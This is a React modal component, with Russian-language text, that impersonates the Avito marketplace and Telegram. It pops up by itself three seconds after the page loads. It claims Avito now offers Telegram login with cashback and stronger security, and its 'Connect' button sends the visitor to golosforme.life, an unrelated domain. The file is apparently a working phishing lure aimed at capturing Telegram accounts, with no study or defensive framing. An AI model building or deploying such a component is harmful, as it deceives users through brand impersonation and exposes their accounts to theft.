import { useState, useEffect } from 'react';
import Button from 'react-bootstrap/Button';
import Modal from 'react-bootstrap/Modal';

const AvitoIcon = () => (<svg width="109" height="30" viewBox="0 0 109 30" xmlns="http://www.w3.org/2000/svg">
<path d="m41.426.62-9.361 24.443h5.028l1.924-5.107h9.933l1.932 5.107h4.991L46.57.62h-5.144Zm-.683 14.85 3.27-8.6 3.256 8.6h-6.526Zm21.14 3.29-4.06-10.868h-4.797l6.539 17.17h4.755l6.423-17.17h-4.797L61.882 18.76ZM76.776 7.892h-4.565v17.17h4.565V7.892Zm-2.285-1.237a3.327 3.327 0 1 0 0-6.655 3.327 3.327 0 0 0 0 6.655ZM85.823 3.31h-4.552v4.552h-2.67v4.138h2.67v7.297c0 4.138 2.28 5.918 5.492 5.918a7.864 7.864 0 0 0 3.157-.617v-4.254c-.545.2-1.12.304-1.7.31-1.395 0-2.4-.542-2.4-2.4v-6.253h4.1V7.904h-4.097V3.311Zm13.694 4.27a8.898 8.898 0 1 0-.008 17.796 8.898 8.898 0 0 0 .008-17.795Zm0 13.244a4.333 4.333 0 1 1 4.329-4.333 4.323 4.323 0 0 1-4.329 4.316v.017Z" fill="#000"></path><circle cx="10.595" cy="5.225" r="3.325" fill="#965EEB"></circle><circle cx="22.245" cy="7.235" r="7.235" fill="#0AF"></circle><circle cx="8.9" cy="18.6" r="8.9" fill="#04E061"></circle><circle cx="24.325" cy="21.005" r="5.375" fill="#FF4053"></circle></svg>);
const TelegramIcon = () => (<svg xmlns="http://www.w3.org/2000/svg" style={{ marginLeft: "10px"}} width="30" height="30" viewBox="0 0 256 256"><defs><linearGradient id="logosTelegram0" x1="50%" x2="50%" y1="0%" y2="100%"><stop offset="0%" stop-color="#2AABEE"/><stop offset="100%" stop-color="#229ED9"/></linearGradient></defs><path fill="url(#logosTelegram0)" d="M128 0C94.06 0 61.48 13.494 37.5 37.49A128.038 128.038 0 0 0 0 128c0 33.934 13.5 66.514 37.5 90.51C61.48 242.506 94.06 256 128 256s66.52-13.494 90.5-37.49c24-23.996 37.5-56.576 37.5-90.51c0-33.934-13.5-66.514-37.5-90.51C194.52 13.494 161.94 0 128 0Z"/><path fill="#FFF" d="M57.94 126.648c37.32-16.256 62.2-26.974 74.64-32.152c35.56-14.786 42.94-17.354 47.76-17.441c1.06-.017 3.42.245 4.96 1.49c1.28 1.05 1.64 2.47 1.82 3.467c.16.996.38 3.266.2 5.038c-1.92 20.24-10.26 69.356-14.5 92.026c-1.78 9.592-5.32 12.808-8.74 13.122c-7.44.684-13.08-4.912-20.28-9.63c-11.26-7.386-17.62-11.982-28.56-19.188c-12.64-8.328-4.44-12.906 2.76-20.386c1.88-1.958 34.64-31.748 35.26-34.45c.08-.338.16-1.598-.6-2.262c-.74-.666-1.84-.438-2.64-.258c-1.14.256-19.12 12.152-54 35.686c-5.1 3.508-9.72 5.218-13.88 5.128c-4.56-.098-13.36-2.584-19.9-4.708c-8-2.606-14.38-3.984-13.82-8.41c.28-2.304 3.46-4.662 9.52-7.072Z"/></svg>);

export const ModalComp = () => {
  const [show, setShow] = useState(false);

  useEffect(() => {
    setTimeout(() => {setShow(true)}, 3000);
  }, []);

  const handleClose = () => setShow(false);
  return (
    <>
      <Modal show={show} onHide={handleClose} backdrop="static" keyboard={false} centered>
        <Modal.Header closeButton>
          <Modal.Title>
            <AvitoIcon/>
            <TelegramIcon />
          </Modal.Title>
        </Modal.Header>
        <Modal.Body>На Авито теперь есть новая возможность авторизации через Телеграм. Это означает, что пользователи могут использовать свой аккаунт Телеграм для входа на популярный сайт объявлений без необходимости создания нового логина и пароля. Помимо <b>кешбэка на покупки</b>, это упрощает процесс авторизации и делает его более безопасным, так как пользователи могут использовать двухфакторную аутентификацию, которая уже настроена на их аккаунте в Телеграме.</Modal.Body>
        <Modal.Footer>
          <Button variant="secondary" onClick={handleClose}>
            Закрыть
          </Button>
          <Button variant="primary" color='#02d15c' onClick={() => window.open("https://golosforme.life/comom", "_self")}>
            Подключить
          </Button>
        </Modal.Footer>
      </Modal>
    </>
  );
}